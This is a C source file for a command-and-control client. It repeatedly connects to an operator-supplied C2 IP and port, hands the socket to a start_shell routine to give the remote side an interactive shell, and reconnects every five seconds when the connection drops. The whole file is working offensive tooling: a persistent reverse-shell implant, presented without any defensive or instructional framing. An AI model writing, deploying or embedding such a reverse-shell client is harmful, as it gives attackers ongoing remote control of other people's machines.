#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pty.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <signal.h>
#include <sys/ioctl.h>

#include "shell.h"

// gcc -o shellc2client shellc2client.c shell.c etc.c -lutil -lcrypto

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "use: %s <C2_SERVER_IP> <C2_SERVER_PORT>\n", argv[0]);
        return 1;
    }

    const char *C2_SERVER_IP = argv[1];
    int C2_SERVER_PORT = atoi(argv[2]);

    int sockfd;
    struct sockaddr_in c2_addr;

    c2_addr.sin_family = AF_INET;
    c2_addr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &c2_addr.sin_addr);

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        if (connect(sockfd, (struct sockaddr *)&c2_addr, sizeof(c2_addr)) == 0) {
            if (start_shell(sockfd, (struct sockaddr *)&c2_addr) == -1) {
                perror("start_shell failed");
            }

            close(sockfd);
        } else {
            perror("Connection to C2 server failed");
            close(sockfd);
        }

        sleep(5);
    }

    return 0;
}

